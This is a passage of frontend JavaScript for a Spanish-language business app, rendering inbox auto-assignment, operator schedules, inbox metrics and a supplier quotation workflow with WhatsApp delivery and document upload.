    if (h < 48) return `${h.toFixed(1)}h`;
    return `${(h/24).toFixed(1)}d`;
}

async function openInboxAutoAssign() {
    showModal('Auto-asignacion de operadores', '<div style="padding:20px;text-align:center;color:#6b7280">Cargando...</div>');
    const body = document.querySelector('.modal-overlay .modal-body');
    if (!body) return;

    const [resp, slaResp] = await Promise.all([
        API.inboxAutoAssignGet(),
        API.inboxSlaHandoffGet(),
    ]);
    if (!resp || !resp.ok) {
        body.innerHTML = `<div style="color:#dc2626;padding:20px">${icon('x',16)} ${esc(resp && (resp.error || resp.detail) || 'Error cargando configuracion')}</div>`;
        return;
    }
    const d = resp.data;
    const sla = (slaResp && slaResp.ok) ? slaResp.data : { enabled: false, threshold_hours: 4, min_threshold_hours: 1, max_threshold_hours: 72 };
    const pool = new Set((d.pool_user_ids || []).map(x => Number(x)));
    const schedChip = (o) => {
        if (!o.has_schedule) {
            return '<span style="font-size:11px;padding:2px 8px;border-radius:10px;background:#fef3c7;color:#92400e" title="Sin horario definido — siempre on-duty">Sin horario</span>';
        }
        if (o.is_on_duty_now) {
            return '<span style="font-size:11px;padding:2px 8px;border-radius:10px;background:#dcfce7;color:#166534" title="On-duty ahora">On-duty</span>';
        }
        return '<span style="font-size:11px;padding:2px 8px;border-radius:10px;background:#e5e7eb;color:#374151" title="Off-duty ahora">Off-duty</span>';
    };
    const opRows = (d.operators || []).map(o => `
        <div style="display:flex;align-items:center;gap:8px;padding:8px;border-bottom:1px solid #f3f4f6">
            <label style="display:flex;align-items:center;gap:8px;flex:1;cursor:pointer">
                <input type="checkbox" class="aa-op" data-id="${o.id}" ${pool.has(o.id) ? 'checked' : ''}>
                <span style="flex:1">
                    <div style="font-weight:600">${esc(o.name || o.email)}</div>
                    <div style="font-size:11px;color:#6b7280">${esc(o.role)} · ${esc(o.email)}</div>
                </span>
            </label>
            ${schedChip(o)}
            <span style="font-size:12px;padding:2px 8px;border-radius:10px;background:#eef2ff;color:#4338ca">${o.open_sessions} abiertas</span>
            <button class="btn btn-secondary" style="padding:4px 8px;font-size:11px" onclick="openOperatorSchedule(${o.id}, '${esc(o.name || o.email).replace(/'/g,"\\'")}')">Horario</button>
        </div>
    `).join('');

    body.innerHTML = `
        <div style="padding:16px;display:flex;flex-direction:column;gap:16px">
            <div style="display:flex;align-items:center;gap:8px">
                <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-weight:600">
                    <input type="checkbox" id="aa-enabled" ${d.enabled ? 'checked' : ''}>
                    Auto-asignacion activa
                </label>
            </div>
            <div>
                <label style="display:block;font-weight:600;margin-bottom:6px">Estrategia</label>
                <label style="display:block;padding:6px 0"><input type="radio" name="aa-strategy" value="round_robin" ${d.strategy === 'round_robin' ? 'checked' : ''}> <b>Round-robin</b> <span style="color:#6b7280;font-size:12px">— rota entre el pool en orden estable</span></label>
                <label style="display:block;padding:6px 0"><input type="radio" name="aa-strategy" value="least_loaded" ${d.strategy === 'least_loaded' ? 'checked' : ''}> <b>Least-loaded</b> <span style="color:#6b7280;font-size:12px">— elige al que tiene menos sesiones abiertas</span></label>
            </div>
            <div>
                <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:6px">
                    <label style="font-weight:600">Pool de operadores elegibles</label>
                    <span style="font-size:11px;color:#6b7280">Deja todos sin marcar para usar todo el staff activo</span>
                </div>
                <div style="border:1px solid #e5e7eb;border-radius:6px;max-height:260px;overflow:auto">
                    ${opRows || '<div style="padding:16px;color:#6b7280;text-align:center">Sin staff activo</div>'}
                </div>
            </div>
            <div style="border:1px solid #e5e7eb;border-radius:6px;padding:12px;background:#f9fafb">
                <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
                    <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-weight:600">
                        <input type="checkbox" id="sla-enabled" ${sla.enabled ? 'checked' : ''}>
                        Auto-handoff por timeout SLA
                    </label>
                </div>
                <div style="font-size:12px;color:#6b7280;margin-bottom:8px">
                    Si el operador asignado no responde dentro del umbral y el cliente sigue esperando,
                    la sesion se reasigna a otro operador on-duty (o se libera al pool si no hay candidato).
                    Chequeo cada 15 minutos.
                </div>
                <div style="display:flex;align-items:center;gap:8px">
                    <label for="sla-threshold" style="font-size:13px">Umbral (horas):</label>
                    <input id="sla-threshold" type="number" min="${sla.min_threshold_hours || 1}" max="${sla.max_threshold_hours || 72}" value="${sla.threshold_hours}" style="width:80px;padding:4px 6px;border:1px solid #d1d5db;border-radius:4px">
                    <span style="font-size:11px;color:#6b7280">(${sla.min_threshold_hours || 1}–${sla.max_threshold_hours || 72})</span>
                </div>
            </div>
            <div style="display:flex;justify-content:flex-end;gap:8px">
                <button class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
                <button class="btn btn-primary" onclick="saveInboxAutoAssign()">Guardar</button>
            </div>
        </div>
    `;
}

async function saveInboxAutoAssign() {
    const body = document.querySelector('.modal-overlay .modal-body');
    if (!body) return;
    const enabled = body.querySelector('#aa-enabled').checked;
    const strategy = (body.querySelector('input[name="aa-strategy"]:checked') || {}).value || 'round_robin';
    const pool_user_ids = Array.from(body.querySelectorAll('.aa-op:checked')).map(el => Number(el.dataset.id));

    const slaEnabledEl = body.querySelector('#sla-enabled');
    const slaThresholdEl = body.querySelector('#sla-threshold');
    const slaEnabled = slaEnabledEl ? !!slaEnabledEl.checked : false;
    const slaThreshold = slaThresholdEl ? Number(slaThresholdEl.value) : 4;

    const [resp, slaResp] = await Promise.all([
        API.inboxAutoAssignSave({ enabled, strategy, pool_user_ids }),
        API.inboxSlaHandoffSave({ enabled: slaEnabled, threshold_hours: slaThreshold }),
    ]);
    const okBoth = resp && resp.ok && slaResp && slaResp.ok;
    if (okBoth) {
        toast('Configuracion guardada', 'success');
        closeModal();
    } else {
        const err = (resp && (resp.error || resp.detail)) || (slaResp && (slaResp.error || slaResp.detail)) || 'Error al guardar';
        toast(err, 'error');
    }
}

// ── Operator schedule (5.8) ─────────────────────────────────────
const WEEKDAY_LABELS = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

async function openOperatorSchedule(userId, userName) {
    showModal(`Horario — ${userName}`, '<div style="padding:20px;text-align:center;color:#6b7280">Cargando...</div>');
    const body = document.querySelector('.modal-overlay .modal-body');
    if (!body) return;

    const resp = await API.operatorScheduleGet(userId);
    if (!resp || !resp.ok) {
        body.innerHTML = `<div style="color:#dc2626;padding:20px">${icon('x',16)} ${esc(resp && (resp.error || resp.detail) || 'Error cargando horario')}</div>`;
        return;
    }

    // Estado local: agrupado por weekday
    const byDay = [[], [], [], [], [], [], []];
    (resp.data.windows || []).forEach(w => {
        byDay[w.weekday].push({ start_time: w.start_time, end_time: w.end_time });
    });
    window._opSchedState = { userId, byDay };

    body.innerHTML = `
        <div style="padding:16px;display:flex;flex-direction:column;gap:12px">
            <div style="font-size:12px;color:#6b7280">
                Sin ventanas definidas = operador siempre on-duty.
                Para turnos que cruzan medianoche (ej: 22:00-02:00)
                crea dos ventanas: 22:00-23:59 en un dia y 00:00-02:00 en el siguiente.
            </div>
            <div id="op-sched-days"></div>
            <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;padding-top:8px;border-top:1px solid #e5e7eb">
                <button class="btn btn-secondary" style="padding:6px 12px" onclick="opSchedClearAll()">Borrar todas</button>
                <div style="display:flex;gap:8px">
                    <button class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
                    <button class="btn btn-primary" onclick="saveOperatorSchedule()">Guardar</button>
                </div>
            </div>
        </div>
    `;
    renderOpSchedDays();
}

function renderOpSchedDays() {
    const host = document.getElementById('op-sched-days');
    if (!host) return;
    const { byDay } = window._opSchedState;
    host.innerHTML = byDay.map((windows, wd) => {
        const rows = windows.map((w, idx) => `
            <div style="display:flex;align-items:center;gap:6px;margin-top:4px">
                <input type="time" value="${esc(w.start_time)}" onchange="opSchedUpdate(${wd}, ${idx}, 'start_time', this.value)" style="padding:4px 6px;border:1px solid #d1d5db;border-radius:4px">
                <span style="color:#6b7280">-</span>
                <input type="time" value="${esc(w.end_time)}" onchange="opSchedUpdate(${wd}, ${idx}, 'end_time', this.value)" style="padding:4px 6px;border:1px solid #d1d5db;border-radius:4px">
                <button class="btn btn-secondary" style="padding:2px 8px;font-size:11px" onclick="opSchedRemove(${wd}, ${idx})">Quitar</button>
            </div>
        `).join('');
        return `
            <div style="display:flex;gap:12px;padding:8px 0;border-bottom:1px solid #f3f4f6">
                <div style="width:50px;font-weight:600">${WEEKDAY_LABELS[wd]}</div>
                <div style="flex:1">
                    ${rows || '<div style="font-size:11px;color:#9ca3af;font-style:italic">Sin ventanas</div>'}
                    <button class="btn btn-secondary" style="padding:4px 8px;font-size:11px;margin-top:6px" onclick="opSchedAdd(${wd})">+ Agregar ventana</button>
                </div>
            </div>
        `;
    }).join('');
}

function opSchedAdd(wd) {
    window._opSchedState.byDay[wd].push({ start_time: '09:00', end_time: '17:00' });
    renderOpSchedDays();
}

function opSchedRemove(wd, idx) {
    window._opSchedState.byDay[wd].splice(idx, 1);
    renderOpSchedDays();
}

function opSchedUpdate(wd, idx, field, value) {
    window._opSchedState.byDay[wd][idx][field] = value;
}

function opSchedClearAll() {
    if (!confirm('Borrar todas las ventanas de este operador?')) return;
    window._opSchedState.byDay = [[], [], [], [], [], [], []];
    renderOpSchedDays();
}

async function saveOperatorSchedule() {
    const { userId, byDay } = window._opSchedState || {};
    if (!userId) return;
    const windows = [];
    byDay.forEach((dayWindows, wd) => {
        dayWindows.forEach(w => {
            if (w.start_time && w.end_time) {
                windows.push({ weekday: wd, start_time: w.start_time, end_time: w.end_time });
            }
        });
    });
    const resp = await API.operatorScheduleSave(userId, windows);
    if (resp && resp.ok) {
        toast('Horario guardado', 'success');
        // Volver al modal de Auto-asignacion para reflejar estado actualizado
        openInboxAutoAssign();
    } else {
        toast((resp && (resp.error || resp.detail)) || 'Error al guardar horario', 'error');
    }
}

async function openInboxMetrics() {
    showModal('Metricas del inbox', '<div style="padding:20px;text-align:center;color:#6b7280">Cargando...</div>');
    const body = document.querySelector('.modal-overlay .modal-body');
    if (!body) return;

    const days = 7;
    const slaHours = 1;
    const resp = await API.inboxMetrics(days, slaHours);
    if (!resp || !resp.ok) {
        body.innerHTML = `<div style="color:#dc2626;padding:20px">${icon('x',16)} ${esc(resp && (resp.error || resp.detail) || 'Error cargando metricas')}</div>`;
        return;
    }
    const d = resp.data;

    const kpi = (label, value, color) => `
        <div style="flex:1;min-width:120px;padding:12px;background:${color}20;border-radius:8px;text-align:center">
            <div style="font-size:22px;font-weight:700;color:${color}">${value}</div>
            <div style="font-size:11px;color:#6b7280;margin-top:2px">${esc(label)}</div>
        </div>
    `;

    const opRows = (d.by_operator || []).map(o => `
        <tr>
            <td>${esc(o.operator_name || `user#${o.operator_id}`)}</td>
            <td style="text-align:center">${o.open}</td>
            <td style="text-align:center">${o.closed_in_window}</td>
            <td style="text-align:right">${_fmtSec(o.first_response_avg_seconds)} <small style="color:#9ca3af">(${o.responses_counted})</small></td>
        </tr>
    `).join('') || `<tr><td colspan="4" style="text-align:center;color:#9ca3af;padding:12px">Sin datos</td></tr>`;

    const maxVol = Math.max(1, ...(d.volume_by_day || []).map(v => v.count));
    const volHtml = (d.volume_by_day || []).map(v => `
        <div style="display:flex;align-items:center;gap:8px;font-size:12px;margin-bottom:3px">
            <div style="width:80px;color:#6b7280">${esc(v.day)}</div>
            <div style="flex:1;background:#e0e7ff;height:14px;border-radius:3px;position:relative">
                <div style="width:${(v.count/maxVol)*100}%;background:#4f46e5;height:100%;border-radius:3px"></div>
            </div>
            <div style="width:40px;text-align:right;font-weight:600">${v.count}</div>
        </div>
    `).join('') || `<div style="color:#9ca3af;font-size:12px">Sin mensajes en la ventana</div>`;

    body.innerHTML = `
        <div style="display:grid;gap:14px;max-width:720px">
            <div style="display:flex;gap:8px;flex-wrap:wrap">
                ${kpi('Abiertas', d.open_sessions, '#0284c7')}
                ${kpi('Sin asignar', d.open_unassigned, '#d97706')}
                ${kpi('Pendientes', d.pending_response, '#dc2626')}
                ${kpi(`SLA breach >${d.sla_hours}h`, d.sla_breach, '#991b1b')}
            </div>
            <div style="display:flex;gap:8px;flex-wrap:wrap">
                ${kpi('1er respuesta promedio', _fmtSec(d.first_response_avg_seconds) + ` (${d.first_response_samples})`, '#16a34a')}
                ${kpi('Resolucion promedio', _fmtHours(d.resolution_avg_hours) + ` (${d.resolution_samples})`, '#7c3aed')}
            </div>
            <div>
                <h4 style="margin:0 0 8px 0;font-size:14px">Volumen inbound ultimos ${d.window_days} dias</h4>
                <div>${volHtml}</div>
            </div>
            <div>
                <h4 style="margin:0 0 8px 0;font-size:14px">Por operador</h4>
                <table class="table" style="width:100%;font-size:12.5px">
                    <thead>
                        <tr>
                            <th style="text-align:left">Operador</th>
                            <th>Abiertas</th>
                            <th>Cerradas (${d.window_days}d)</th>
                            <th style="text-align:right">1er resp. prom.</th>
                        </tr>
                    </thead>
                    <tbody>${opRows}</tbody>
                </table>
            </div>
            <small style="color:#9ca3af">Generado: ${esc(d.generated_at)}</small>
        </div>
    `;
}

function _renderInboxMessage(m) {
    let cls = 'inbox-msg-in';
    let prefix = '';
    if (m.sender_type === 'note') {
        // 5.3 nota interna: estilo diferenciado
        const when = m.created_at ? new Date(m.created_at).toLocaleString() : '';
        const bodyN = m.body ? esc(m.body).replace(/\n/g, '<br>') : '';
        return `
            <div class="inbox-msg" style="align-self:center;background:#fef3c7;color:#78350f;border:1px dashed #f59e0b;max-width:90%;font-style:italic;font-size:12.5px">
                📝 Nota · ${bodyN}
                <div class="inbox-msg-meta" style="color:#92400e">${when}</div>
            </div>
        `;
    }
    if (m.direction === 'outbound' && m.sender_type === 'bot') {
        cls = 'inbox-msg-bot';
        prefix = '🤖 Bot';
    } else if (m.direction === 'outbound' && m.sender_type === 'operator') {
        cls = 'inbox-msg-out';
        prefix = '👤 Operador';
    } else if (m.direction === 'outbound' && m.sender_type === 'system') {
        cls = 'inbox-msg-bot';
        prefix = '⚙️ Sistema';
    } else {
        prefix = '📱 Cliente';
    }
    const ch = m.channel === 'whatsapp' ? 'WA' : (m.channel === 'telegram' ? 'TG' : (m.channel || ''));
    const media = m.media_type ? ` [${esc(m.media_type)}]` : '';
    const body = m.body ? esc(m.body).replace(/\n/g, '<br>') : (m.media_type ? `<i>${esc(m.media_type)}</i>` : '<i>(sin contenido)</i>');
    const when = m.created_at ? new Date(m.created_at).toLocaleString() : '';
    return `
        <div class="inbox-msg ${cls}">
            ${body}
            <div class="inbox-msg-meta">${prefix} · ${ch}${media} · ${when}</div>
        </div>
    `;
}

// ── Pedidos page ─────────────────────────────────────────────
async function renderPedidos() {
    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
            <div>
                <h1 class="page-title">Cotizaciones</h1>
                <p class="page-subtitle">Gestiona tus solicitudes de precios de proveedores</p>
            </div>
            <div style="display:flex;gap:8px">
                <button class="btn btn-primary" onclick="showCartModal()">${icon('shopping-cart',16)} Carrito (${state.cart.length})</button>
            </div>
        </div>
        <div class="pedido-filters" style="margin-bottom:16px;display:flex;gap:8px;flex-wrap:wrap">
            <button class="chip active" onclick="loadPedidos(null, this)">Todos</button>
            <button class="chip" onclick="loadPedidos('draft', this)">Borrador</button>
            <button class="chip" onclick="loadPedidos('active', this)">Activo</button>
            <button class="chip" onclick="loadPedidos('completed', this)">Completado</button>
        </div>
        <div id="pedidos-list"><div class="empty-state"><p>Cargando...</p></div></div>
    `;
    loadPedidos(null);
}

async function loadPedidos(stateFilter, chipEl) {
    if (chipEl) {
        document.querySelectorAll('.pedido-filters .chip').forEach(c => c.classList.remove('active'));
        chipEl.classList.add('active');
    }
    const params = stateFilter ? `?state=${stateFilter}` : '';
    try {
        const resp = await API.pedidos(params);
        const container = document.getElementById('pedidos-list');
        if (!resp.ok) { container.innerHTML = '<div class="empty-state"><p>Error cargando pedidos</p></div>'; return; }
        if (!resp.data.length) {
            container.innerHTML = `
                <div class="empty-state" style="padding:40px">
                    <p>No tienes pedidos${stateFilter ? ' en este estado' : ''}</p>
                    <p style="font-size:13px;color:var(--gray-500);margin-bottom:16px">Agrega materiales al carrito desde Precios y crea tu primer pedido</p>
                    <button class="btn btn-primary" onclick="navigate('prices')">Ir a Precios</button>
                </div>
            `;
            return;
        }
        container.innerHTML = `<div class="pedido-grid">${resp.data.map(renderPedidoCard).join('')}</div>`;
    } catch { document.getElementById('pedidos-list').innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>'; }
}

function renderPedidoCard(p) {
    const stateColors = { draft: '#6b7280', active: '#2563eb', researching: '#d97706', completed: '#16a34a', cancelled: '#dc2626' };
    const stateLabels = { draft: 'Borrador', active: 'Activo', researching: 'Investigando', completed: 'Completado', cancelled: 'Cancelado' };
    return `
        <div class="pedido-card" onclick="openPedidoDetail(${p.id})">
            <div class="pedido-card-header">
                <span class="pedido-ref">${esc(p.reference)}</span>
                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${esc(stateLabels[p.state] || p.state)}</span>
            </div>
            <div class="pedido-card-title">${esc(p.title)}</div>
            <div class="pedido-card-meta">
                ${p.region ? esc(p.region) + ' &middot; ' : ''}${p.item_count} items &middot; ${p.quotes_received || 0} precios
                ${p.deadline ? ' &middot; Limite: ' + new Date(p.deadline).toLocaleDateString() : ''}
            </div>
            <div class="pedido-card-footer">
                <span>${new Date(p.created_at).toLocaleDateString()}</span>
                ${p.currency ? '<span>' + esc(p.currency) + '</span>' : ''}
            </div>
        </div>
    `;
}

// ── Pedido Detail ────────────────────────────────────────────
async function openPedidoDetail(pedidoId) {
    const page = document.getElementById('page-content');
    page.innerHTML = '<div class="empty-state"><p>Cargando pedido...</p></div>';

    try {
        const resp = await API.pedido(pedidoId);
        if (!resp.ok) { page.innerHTML = '<div class="empty-state"><p>Error cargando pedido</p></div>'; return; }
        renderPedidoDetail(resp.data);
    } catch { page.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>'; }
}

function renderPedidoDetail(p) {
    const page = document.getElementById('page-content');
    const stateLabels = { draft: 'Borrador', active: 'Activo', researching: 'Investigando', completed: 'Completado', cancelled: 'Cancelado' };
    const stateColors = { draft: '#6b7280', active: '#2563eb', researching: '#d97706', completed: '#16a34a', cancelled: '#dc2626' };
    const isEditable = p.state !== 'completed' && p.state !== 'cancelled';

    const itemRows = (p.items || []).map(item => {
        const precioRows = (item.precios || []).map(pr => `
            <div class="precio-row ${pr.is_selected ? 'precio-selected' : ''}">
                <span class="precio-supplier">${esc(pr.supplier_name_text || 'Proveedor #' + (pr.supplier_id || '?'))}</span>
                <span class="precio-value">${pr.unit_price.toFixed(2)} ${esc(pr.currency)}</span>
                <span class="precio-source">${esc(pr.source)}</span>
                ${isEditable ? `<button class="btn-cart-add btn-cart-sm" onclick="selectPrecio(${p.id},${item.id},${pr.id})" title="Seleccionar">${pr.is_selected ? '★' : '☆'}</button>` : (pr.is_selected ? '★' : '')}
            </div>
        `).join('');

        return `
            <div class="pedido-item-row">
                <div class="pedido-item-header">
                    <div>
                        <span class="pedido-item-seq">#${item.sequence + 1}</span>
                        <strong>${esc(item.name)}</strong>
                        ${item.uom ? '<span class="pedido-item-uom">' + esc(item.uom) + '</span>' : ''}
                    </div>
                    <div style="display:flex;align-items:center;gap:8px">
                        <span class="pedido-item-qty">x${item.quantity}</span>
                        ${item.ref_price ? '<span class="pedido-item-ref">Ref: ' + item.ref_price.toFixed(2) + '</span>' : ''}
                        ${isEditable ? `<button class="btn btn-sm btn-primary" onclick="showAddPrecioModal(${p.id},${item.id},'${escJs(item.name)}')">+ Precio</button>` : ''}
                    </div>
                </div>
                ${precioRows ? '<div class="pedido-item-precios">' + precioRows + '</div>' : '<div class="pedido-item-precios" style="color:var(--gray-400);font-size:12px;padding:4px 0">Sin precios registrados</div>'}
            </div>
        `;
    }).join('');

    const actions = [];
    if (p.wa_confirmation_url) {
        actions.push(`<a href="${esc(safeUrl(p.wa_confirmation_url))}" target="_blank" class="btn" style="background:#25D366;color:white;border-color:#25D366">${icon('whatsapp',16)} Re-enviar WhatsApp</a>`);
    }
    const canDeliver = isEditable && p.state !== 'draft' && (p.assigned_to === state.user?.id || p.created_by === state.user?.id);
    if (canDeliver) {
        actions.push(`<button class="btn" style="background:#25D366;color:white;border-color:#25D366" onclick="deliverPedidoQuote(${p.id})">${icon('whatsapp',16)} Enviar cotizacion al cliente</button>`);
    }
    if (isEditable) {
        actions.push(`<button class="btn btn-secondary" onclick="showUploadDocModal(${p.id})">${icon('upload',16)} Subir Documento</button>`);
        actions.push(`<button class="btn btn-primary" onclick="completePedido(${p.id})">Marcar Completado</button>`);
    }
    if (p.state === 'draft') {
        actions.push(`<button class="btn btn-danger" onclick="deletePedido(${p.id})">Eliminar</button>`);
    }

    page.innerHTML = `
        <div style="margin-bottom:16px">
            <button class="btn btn-secondary btn-sm" onclick="renderPedidos()">&larr; Volver a Pedidos</button>
        </div>
        <div class="pedido-detail-header">
            <div>
                <span class="pedido-ref">${esc(p.reference)}</span>
                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${esc(stateLabels[p.state] || p.state)}</span>
            </div>
            <h2 style="margin:8px 0 4px">${esc(p.title)}</h2>
            ${p.description ? '<p style="color:var(--gray-500);font-size:14px">' + esc(p.description) + '</p>' : ''}
            <div style="font-size:13px;color:var(--gray-500);margin-top:4px">
                ${p.region ? esc(p.region) + ' &middot; ' : ''}${esc(p.currency)} &middot; ${p.item_count} items &middot; ${p.quotes_received || 0} precios
                ${p.deadline ? ' &middot; Limite: ' + new Date(p.deadline).toLocaleDateString() : ''}
                &middot; Creado: ${new Date(p.created_at).toLocaleDateString()}
            </div>
        </div>
        <div class="pedido-items-section">
            <h3 style="margin-bottom:12px">Items del Pedido</h3>
            ${itemRows || '<div class="empty-state"><p>Sin items</p></div>'}
        </div>
        ${actions.length ? '<div class="pedido-actions">' + actions.join(' ') + '</div>' : ''}
    `;
}

function showAddPrecioModal(pedidoId, itemId, itemName) {
    showModal('Agregar Precio — ' + itemName, `
        <form onsubmit="handleAddPrecio(event, ${pedidoId}, ${itemId})">
            <div class="form-group">
                <label class="form-label">Proveedor (nombre)</label>
                <input class="form-input" name="supplier_name_text" placeholder="Nombre del proveedor">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Precio unitario *</label>
                    <input class="form-input" name="unit_price" type="number" step="0.01" min="0" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Moneda</label>
                    <select class="form-input" name="currency">
                        <option value="BOB">BOB</option>
                        <option value="USD">USD</option>
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Fuente</label>
                <select class="form-input" name="source">
                    <option value="manual">Manual (llamada/visita)</option>
                    <option value="upload">Documento</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Notas</label>
                <textarea class="form-input" name="notes" rows="2" placeholder="Observaciones..."></textarea>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Guardar Precio</button>
            </div>
        </form>
    `);
}

async function handleAddPrecio(e, pedidoId, itemId) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.addPrecio(pedidoId, itemId, {
        supplier_name_text: f.supplier_name_text.value || null,
        unit_price: parseFloat(f.unit_price.value),
        currency: f.currency.value,
        source: f.source.value,
        notes: f.notes.value || null,
    });
    if (resp.ok) {
        closeModal();
        toast('Precio registrado', 'success');
        openPedidoDetail(pedidoId);
    } else {
        toast(resp.detail || 'Error', 'error');
    }
}

async function selectPrecio(pedidoId, itemId, precioId) {
    const resp = await API.selectPrecio(pedidoId, itemId, precioId);
    if (resp.ok) {
        toast('Precio seleccionado', 'success');
        openPedidoDetail(pedidoId);
    } else toast(resp.detail || 'Error', 'error');
}

async function completePedido(pedidoId) {
    if (!confirm('Marcar este pedido como completado?')) return;
    const resp = await API.completePedido(pedidoId);
    if (resp.ok) {
        toast('Pedido completado', 'success');
        openPedidoDetail(pedidoId);
    } else toast(resp.detail || 'Error', 'error');
}

async function deliverPedidoQuote(pedidoId) {
    if (!confirm('Enviar la cotizacion al cliente por WhatsApp?')) return;
    toast('Enviando cotizacion...', 'info');
    const resp = await API.deliverPedido(pedidoId);
    if (resp.ok && resp.mode === 'whatsapp') {
        toast('Cotizacion enviada por WhatsApp', 'success');
        openPedidoDetail(pedidoId);
        return;
    }
    if (resp.ok && resp.mode === 'email') {
        toast('Cotizacion enviada por email (WA no disponible)', 'success');
        openPedidoDetail(pedidoId);
        return;
    }
    const mode = resp.mode || 'error';
    if (mode === 'window_closed') {
        showModal('Ventana de WhatsApp cerrada', `
            <p>Pasaron mas de 24 horas desde el ultimo mensaje del cliente, asi que WhatsApp no permite enviar automaticamente.</p>
            <p style="margin-top:12px">Opciones:</p>
            <ul style="margin:8px 0 12px 20px;line-height:1.6">
                <li>Pedir al cliente que escriba cualquier mensaje (reabre la ventana)</li>
                <li>Re-enviar el link wa.me desde el boton verde superior</li>
                <li>Contactar por telefono o email</li>
            </ul>
            <div style="text-align:right">
                <button class="btn btn-primary" onclick="closeModal()">Entendido</button>
            </div>
        `);
    } else if (mode === 'no_session') {
        toast('No hay sesion de WhatsApp para este pedido. Re-envia el link wa.me al cliente.', 'error');
    } else if (mode === 'no_phone') {
        toast('No se registro un numero de WhatsApp del cliente en la sesion.', 'error');
    } else {
        toast(resp.detail || 'Error enviando cotizacion', 'error');
    }
}

async function deletePedido(pedidoId) {
    if (!confirm('Eliminar este pedido? Esta accion no se puede deshacer.')) return;
    const resp = await API.deletePedido(pedidoId);
    if (resp.ok) {
        toast('Pedido eliminado', 'success');
        renderPedidos();
    } else toast(resp.detail || 'Error', 'error');
}

function showUploadDocModal(pedidoId) {
    showModal('Subir Documento de Cotizacion', `
        <form onsubmit="handleUploadDoc(event, ${pedidoId})">
            <div class="form-group">
                <label class="form-label">Archivo (PDF, Excel, imagen)</label>
                <input class="form-input" name="file" type="file" accept=".pdf,.xlsx,.xls,.csv,.png,.jpg,.jpeg,.webp" required>
            </div>
            <div class="form-group">
                <label class="form-label">Nombre del proveedor</label>
                <input class="form-input" name="supplier_name" placeholder="Proveedor que envio la cotizacion">
            </div>
            <p style="font-size:12px;color:var(--gray-500);margin:8px 0">
                La IA extraera los precios del documento y los asociara automaticamente con los items de tu pedido.
            </p>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">${icon('upload',16)} Subir y Procesar</button>
            </div>
        </form>
    `);
}

async function handleUploadDoc(e, pedidoId) {
    e.preventDefault();
    const f = e.target;
    const file = f.file.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);
    formData.append('supplier_name', f.supplier_name.value || '');

    const submitBtn = f.querySelector('button[type=submit]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Procesando...';

    try {
        const resp = await API.uploadPedidoDoc(pedidoId, formData);
        if (resp.ok) {
            closeModal();
            showUploadResultsModal(resp, pedidoId);
        } else {
            toast(resp.detail || 'Error procesando documento', 'error');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Subir y Procesar';
        }
    } catch {
        toast('Error de conexion', 'error');
        submitBtn.disabled = false;
        submitBtn.textContent = 'Subir y Procesar';
    }
}

function showUploadResultsModal(resp, pedidoId) {
    const lines = resp.lines || [];
    const matched = resp.matched || 0;
    const extracted = resp.extracted || 0;

    const linesHtml = lines.length ? lines.map(l => {
        const hasMatch = l.matched_to && l.matched_to.item_id;
        const scorePercent = Math.round((l.score || 0) * 100);
        const scoreClass = scorePercent >= 70 ? 'high' : scorePercent >= 40 ? 'med' : 'low';
        return `
            <div class="upload-result-line ${hasMatch ? 'matched' : 'unmatched'}">
                <div class="upload-result-line-header">
                    <span class="upload-result-name">${esc(l.name || 'Sin nombre')}</span>
                    <span class="upload-result-price">${l.price != null ? Number(l.price).toFixed(2) + ' Bs' : '-'}</span>
                </div>
                <div class="upload-result-meta">
                    ${l.uom ? `<span class="upload-result-tag">${esc(l.uom)}</span>` : ''}
                    ${l.quantity ? `<span class="upload-result-tag">Cant: ${l.quantity}</span>` : ''}
                    ${hasMatch
                        ? `<span class="upload-result-match">${icon('check',14)} ${esc(l.matched_to.item_name)}</span>
                           <span class="upload-result-score score-${scoreClass}">${scorePercent}%</span>`
                        : `<span class="upload-result-nomatch">${icon('x',14)} Sin coincidencia</span>`
                    }
                </div>
            </div>`;
    }).join('') : '<p style="color:var(--gray-500);text-align:center;padding:16px">No se extrajeron lineas del documento.</p>';

    showModal('Resultado de Extraccion', `
        <div class="upload-results-summary">
            <div class="upload-stat">
                <span class="upload-stat-num">${extracted}</span>
                <span class="upload-stat-label">Lineas extraidas</span>
            </div>
            <div class="upload-stat">
                <span class="upload-stat-num">${matched}</span>
                <span class="upload-stat-label">Precios asociados</span>
            </div>
            <div class="upload-stat">
                <span class="upload-stat-num">${extracted - matched}</span>
                <span class="upload-stat-label">Sin coincidencia</span>
            </div>
        </div>
        <div class="upload-results-list">${linesHtml}</div>
        <div style="text-align:right;margin-top:16px">
            <button class="btn btn-primary" onclick="closeModal();openPedidoDetail(${pedidoId})">Cerrar</button>
        </div>
    `);
}

// ── Notifications ─────────────────────────────────────────────
let _notifPollInterval = null;

function startNotifPolling() {
    if (_notifPollInterval) clearInterval(_notifPollInterval);
    updateNotifBadge();
    _notifPollInterval = setInterval(updateNotifBadge, 30000);
}

function stopNotifPolling() {
